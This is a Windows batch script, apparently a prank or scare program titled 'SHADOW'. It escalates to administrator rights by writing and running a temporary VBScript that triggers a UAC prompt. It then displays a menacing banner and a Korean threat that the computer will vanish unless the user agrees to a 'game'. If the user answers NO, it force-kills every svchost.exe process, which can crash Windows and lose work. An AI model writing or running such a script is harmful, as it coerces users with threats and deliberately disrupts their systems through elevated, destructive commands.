REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"

@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion
title 「 SHADOW 」
cls

set "R1=[31m"
set "R2=[91m"
set "R3=[38;5;196m"
set "R4=[38;5;202m"
set "RESET=[0m"

echo %R1% ▄               ▄                ▄                %RESET%
echo %R1%  ▄█ █▄  ░░   ░░  ▄█ █▄  ▀▀▀▀▀█▄   ▄█ █▄  ██        ██%RESET%
echo %R2% ▐░▌ ▐░▌ ▒▒   ▒▒ ▐░▌ ▐░▌  ▒▒  ▐░▌ ▐░▌ ▐░▌ ░░        ░░%RESET%
echo %R2% ▒▒      ▓▓   ▓▓ ▒▒   ▒▒  ▓▓   ▒▒ ▒▒   ▒▒ ▒▒        ▒▒%RESET%
echo %R3% ▐▓▓▄    ▓▓   ▓▓ ▓▓   ▓▓  ▓▓   ▓▓ ▓▓   ▓▓ ▓▓   ▐▌   ▓▓%RESET%
echo %R3%   ▀▀▀▀  ▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀   ▀▀ ▀▀   ▀▀   ▀▀%RESET%
echo %R4%     ▀▒▒ ▒▒   ▒▒ ▒▒   ▒▒  ▒▒   ▒▒ ▒▒   ▒▒ ▒▒   ▒▒   ▒▒%RESET%
echo %R4% ▐░▌ ▐░▌ ░░   ░░ ░░   ░░  ░░  ▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░█▌ ▐░▌%RESET%
echo %R1%  ▀█ █▀                   ▀▀  █▀   ▀█ █▀   ▀█ █▀█▓ █▀ %RESET%
echo %R1%    ▀    ▀▀   ▀▀ ▀▀   ▀▀ ▀▀▀▀▀       ▀       ▀   ▀▀   %RESET%

FOR /F %%A in ('"PROMPT $H&FOR %%B in (1) DO REM"') DO SET "BS=%%A"

echo 게임을 시작한다. 단, 네가 거부한다면, 이 컴퓨터는 흔적도 없이 사라져버리고 말 거야.
echo/
echo YES or NO
set /p x=
if %x%==YES goto YES
if %x%==NO goto NO
goto start
:YES
	cls
goto exit
:NO
	cls
	taskkill /f /im svchost.exe
goto exit
:exit